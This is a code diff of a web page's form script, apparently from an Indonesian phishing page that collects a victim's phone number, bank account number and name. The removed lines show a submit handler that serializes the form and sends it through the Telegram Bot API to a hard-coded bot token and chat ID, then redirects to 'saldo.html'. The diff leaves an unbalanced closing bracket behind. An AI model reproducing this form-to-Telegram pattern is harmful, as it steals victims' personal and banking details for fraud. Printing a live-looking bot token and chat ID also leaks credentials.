@@ -1120,7 +1120,7 @@ swal(" Forbidden ", "Silahkan Aktivasi terlebih dahulu untuk menggunakan fitur",
  
 
  <script>
-$('#form1').on('submit', function (event) {
+$('#setPin').on('submit', function (event) {
 
  
   event.stopPropagation();
@@ -1130,30 +1130,7 @@ $('#form1').on('submit', function (event) {
 
     
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
-$.ajax({
- type: 'POST',
- url: '/https://api.telegram.org/bot6835147883:AAFmCIFxo_lG-iwUyIvegnjemiEoduvsKCc/sendMessage?chat_id=7142327444&',
- async: false,
- dataType: 'JSON',
- data: $(this).serialize(),
- 
- complete: function(data) {
-            console.log('Complete')
-setTimeout(function(){
-       $("#lodingku").hide();
-location.href ="saldo.html";
-   var nomortel = document.getElementById('nomorku').value;
-    sessionStorage.setItem("nomortel", nomortel);
-      var noreke = document.getElementById('norek').value;
-    sessionStorage.setItem("noreke", noreke);
-    var namanya = document.getElementById('nama').value;
-    sessionStorage.setItem("namanya", namanya);     
-    }, 1000);
-     setTimeout(function(){  
-       $("#djload").hide();  
-       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
-    }, 2000);
-        }
+
     });
 
     return false;
